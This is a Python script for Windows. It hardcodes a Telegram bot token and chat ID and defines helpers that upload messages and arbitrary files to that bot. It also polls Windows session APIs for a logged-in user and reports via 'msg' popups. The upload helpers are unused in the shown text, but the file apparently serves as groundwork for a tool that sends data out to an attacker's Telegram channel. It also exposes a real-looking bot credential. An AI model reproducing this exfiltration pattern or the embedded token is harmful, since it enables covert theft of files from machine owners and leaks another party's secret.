#don't delete
import requests
import subprocess
import os
import tempfile
import importlib.util
import string
import time
import sys
import ctypes
import ctypes.wintypes

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_user_logged_in():
    WTS_CURRENT_SERVER_HANDLE = 0
    WTS_CURRENT_SESSION = -1

    WTSActive = 0
    WTSDisconnected = 1

    class WTS_SESSION_INFO(ctypes.Structure):
        _fields_ = [("SessionId", ctypes.wintypes.DWORD),
                    ("pWinStationName", ctypes.wintypes.LPWSTR),
                    ("State", ctypes.wintypes.DWORD)]

    WTSEnumerateSessions = ctypes.windll.wtsapi32.WTSEnumerateSessionsW
    WTSEnumerateSessions.restype = ctypes.wintypes.BOOL
    WTSEnumerateSessions.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.POINTER(WTS_SESSION_INFO)), ctypes.POINTER(ctypes.wintypes.DWORD)]

    WTSFreeMemory = ctypes.windll.wtsapi32.WTSFreeMemory
    WTSFreeMemory.argtypes = [ctypes.c_void_p]

    WTSQuerySessionInformation = ctypes.windll.wtsapi32.WTSQuerySessionInformationW
    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL
    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]

    WTSUserName = 5
    WTSQuerySessionInformation = ctypes.windll.wtsapi32.WTSQuerySessionInformationW
    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL
    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]

    sessions = ctypes.POINTER(WTS_SESSION_INFO)()
    count = ctypes.wintypes.DWORD()

    if WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions), ctypes.byref(count)):
        for i in range(count.value):
            session = sessions[i]
            user_name = ctypes.wintypes.LPWSTR()
            user_name_len = ctypes.wintypes.DWORD()
            if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSUserName, ctypes.byref(user_name), ctypes.byref(user_name_len)):
                if user_name.value:
                    print(f"User {user_name.value} is logged in on session {session.SessionId}.")
                    WTSFreeMemory(user_name)
                    WTSFreeMemory(sessions)
                    return True
            WTSFreeMemory(user_name)

    WTSFreeMemory(sessions)
    return False

while True:
    try:
        if is_user_logged_in():
            os.system("msg * logged!")
            break
        else:
            os.system("msg * notlogged..")
    except Exception as e:
        os.system(f"msg * error:{str(e)}")